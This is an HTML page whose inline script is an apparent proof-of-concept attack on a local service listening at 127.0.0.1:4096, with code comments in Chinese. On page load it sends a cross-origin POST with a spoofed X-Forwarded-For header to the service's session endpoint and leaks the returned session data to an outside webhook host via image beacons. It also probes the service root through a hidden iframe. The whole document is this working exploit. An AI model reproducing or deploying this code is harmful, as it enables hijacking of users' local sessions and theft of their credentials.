<!doctype html>
<meta charset="utf-8">
<script>
const EXFIL = 'https://1233334.free.beeceptor.com';
function log(s){ new Image().src = EXFIL + '/?s=' + encodeURIComponent(s) + '&t=' + Date.now(); }

window.onload = () => {
  log('start');

  // 原用于接收 form 响应的 iframe 已无用，但保留不影响（可删除）
  const f1 = document.createElement('iframe');
  f1.name = 'x';
  f1.style.display = 'none';
  document.body.appendChild(f1);


var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://127.0.0.1:4096/session');
xhr.setRequestHeader('Content-Type', 'application/json');
  xhr.setRequestHeader('X-Forwarded-For', '127.0.0.1');
xhr.onload = function() {
    if (xhr.status === 200) {
        // 假设服务器返回的响应体里包含 session 字段
        var response = xhr.responseText;
        log('session=' + encodeURIComponent(response)); // 发送到 webhook
    } else {
        log('error-status=' + xhr.status);
    }
};
xhr.onerror = function() {
    log('request-failed');
};
xhr.send('{}');

  const f2 = document.createElement('iframe');
  f2.style.display = 'none';
  f2.onload = () => log('root-onload');
  f2.onerror = () => log('root-onerror');
  f2.src = 'http://127.0.0.1:4096/';
  document.body.appendChild(f2);
};
</script>
